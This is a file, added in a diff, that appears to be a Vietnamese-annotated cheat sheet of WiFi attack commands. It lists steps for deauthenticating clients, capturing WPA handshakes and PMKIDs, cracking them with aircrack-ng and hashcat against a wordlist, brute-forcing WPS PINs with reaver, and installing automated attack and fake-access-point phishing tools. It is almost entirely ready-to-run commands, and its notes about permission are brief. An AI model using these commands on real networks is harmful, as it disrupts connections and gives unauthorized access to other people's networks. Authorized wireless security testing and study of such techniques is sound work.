@@ -1,0 +1,92 @@
+TỔNG HỢP TOÀN BỘ LỆNH – WIFI
+
+===================================================================================
+01. Enable Monitor Mode
+Chú thích: Chuyển card WiFi sang monitor mode; tên giao diện có thể khác theo máy. Có thêm lệnh kiểm tra và tắt monitor mode trong file Markdown.
+Nguồn: Enable Monitor Mode và Enable Monitor Mode.md
+-----------------------------------------------------------------------------------
+airmon-ng check kill     # Stop conflicting services
+airmon-ng start wlan0    # Enables monitor mode (becomes wlan0mon)
+airmon-ng check kill
+airmon-ng start wlan0
+iwconfig
+airmon-ng stop wlan0mon
+
+===================================================================================
+02. Scan for WiFi Networks
+Chú thích: Quan sát các trường BSSID, CH, ESSID, dBm; việc quét không đồng nghĩa có quyền truy cập vào mạng.
+Nguồn: Scan for WiFi Networks và Scan for WiFi Networks.md
+-----------------------------------------------------------------------------------
+airodump-ng wlan0mon
+
+===================================================================================
+03. Deauth a Client to Force Reconnect
+Chú thích: Deauthentication làm gián đoạn kết nối; không sử dụng trên thiết bị/mạng không được phép.
+Nguồn: Deauth a Client to Force Reconnect và Deauth a Client to Force Reconnect.md
+-----------------------------------------------------------------------------------
+aireplay-ng --deauth 10 -a <BSSID> wlan0mon
+aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+===================================================================================
+04. Targeted Capture of Handshake
+Chú thích: Ghi dữ liệu trên BSSID và kênh xác định; tên file đầu ra có thể thay đổi theo lệnh.
+Nguồn: Targeted Capture of Handshake và Targeted Capture of Handshake.md
+-----------------------------------------------------------------------------------
+airodump-ng --bssid <BSSID> --channel <CH> -w capture wlan0mon
+airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 -w capture wlan0mon
+
+===================================================================================
+05. Crack the Captured Handshake
+Chú thích: Thử các từ khóa trong danh sách đối với dữ liệu handshake đã thu thập có phép; giữ cả hai tên file .cap như nguồn.
+Nguồn: Crack the Captured Handshake và Crack the Captured Handshake.md
+-----------------------------------------------------------------------------------
+aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID> capture.cap
+aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID> capture-01.cap
+aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
+
+===================================================================================
+06. Cracking Handshake Faster with Hashcat (GPU)
+Chú thích: Ví dụ chuyển dữ liệu và kiểm tra bằng Hashcat; giữ cả lệnh cũ lẫn định dạng mới theo nguồn, không đảm bảo còn tương thích.
+Nguồn: Cracking Handshake Faster with Hashcat (GPU) và Cracking Handshake Faster with Hashcat (GPU).md
+-----------------------------------------------------------------------------------
+cap2hccapx capture.cap capture.hccapx
+hashcat -m 2500 capture.hccapx rockyou.txt --force
+hcxpcapngtool -o capture.22000 capture.pcapng
+hashcat -m 22000 capture.22000 rockyou.txt --force
+cap2hccapx capture-01.cap capture.hccapx
+hcxpcapngtool -o capture.22000 capture-01.cap
+
+===================================================================================
+07. PMKID Attack (No Clients Required!)
+Chú thích: Ba thao tác trong tài liệu: ghi PMKID, chuyển định dạng và kiểm tra dữ liệu; kết quả phụ thuộc cấu hình AP.
+Nguồn: PMKID Attack (No Clients Required!) và PMKID Attack (No Clients Required!).md
+-----------------------------------------------------------------------------------
+hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
+hcxpcapngtool -o pmkid.22000 pmkid.pcapng
+hashcat -m 22000 pmkid.22000 rockyou.txt --force
+
+===================================================================================
+08. WPS PIN Attack with Reaver
+Chú thích: Liên quan khả năng kiểm tra WPS PIN và rủi ro cấu hình yếu; chỉ dùng trên hệ thống được phép.
+Nguồn: WPS PIN Attack with Reaver và WPS PIN Attack with Reaver.md
+-----------------------------------------------------------------------------------
+wash -i wlan0mon
+reaver -i wlan0mon -b <BSSID> -c <CH> -vv
+reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv
+
+===================================================================================
+09. Automated WiFi Attack Tools
+Chú thích: Các lệnh cài đặt/chạy Wifite, Airgeddon, Fluxion, WiFi Pumpkin 3; nguồn có công cụ mô phỏng AP giả và phishing.
+Nguồn: Automated WiFi Attack Tools và Automated WiFi Attack Tools.md
+-----------------------------------------------------------------------------------
+apt install wifite
+wifite
+git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
+cd airgeddon
+bash airgeddon.sh
+git clone https://github.com/FluxionNetwork/fluxion.git
+cd fluxion
+sudo ./fluxion.sh
+git clone https://github.com/P0cL4bs/wifipumpkin3.git
+cd wifipumpkin3
+sudo python3 setup.py install
